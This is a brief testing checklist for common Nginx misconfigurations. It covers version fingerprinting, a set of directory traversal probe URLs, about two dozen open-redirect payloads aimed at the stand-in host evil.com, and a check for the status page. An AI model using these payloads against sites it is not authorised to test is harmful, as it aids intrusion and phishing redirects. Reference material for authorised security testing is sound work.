# Nginx Common Bugs

## Introduction
What would you do if you came across a website that uses Nginx?

## How to Detect
Usually in the HTTP response there is a header like this `Server: nginx`

1. Find the related CVE by checking nginx version
* How to find the nginx version

By checking the response header or using 404 page, sometimes the version is printed there. If you found outdated nginx version, find the CVEs at [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/F5-Nginx.html)

2. Directory traversal
```
https://example.com/folder1../folder1/folder2/static/main.css
https://example.com/folder1../%s/folder2/static/main.css
https://example.com/folder1/folder2../folder2/static/main.css
https://example.com/folder1/folder2../%s/static/main.css
https://example.com/folder1/folder2/static../static/main.css
https://example.com/folder1/folder2/static../%s/main.css
```

3. Open redirect
This is because of misconfiguration
```
https://example.com/%5cevil.com
https://example.com////\;@evil.com
https://example.com////evil.com
https://example.com///evil.com
https://example.com///evil.com/%2f%2e%2e
https://example.com///evil.com@//
https://example.com///{{RootURL}}evil.com/%2f%2e%2e
https://example.com//;@evil.com
https://example.com//\/evil.com/
https://example.com//\@evil.com
https://example.com//\evil.com
https://example.com//\tevil.com/
https://example.com//evil.com/%2F..
https://example.com//evil.com//
https://example.com//evil.com@//
https://example.com//evil.com\tevil.com/
https://example.com//https://evil.com@//
https://example.com/<>//evil.com
https://example.com/\/\/evil.com/
https://example.com/\/evil.com
https://example.com/\evil.com
https://example.com/evil.com
https://example.com/evil.com/%2F..
https://example.com/evil.com/
https://example.com/evil.com/..;/css
https://example.com/https:evil.com
```

4. Nginx status page
```
https://example.com/nginx_status
```

## References
- [Detectify](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)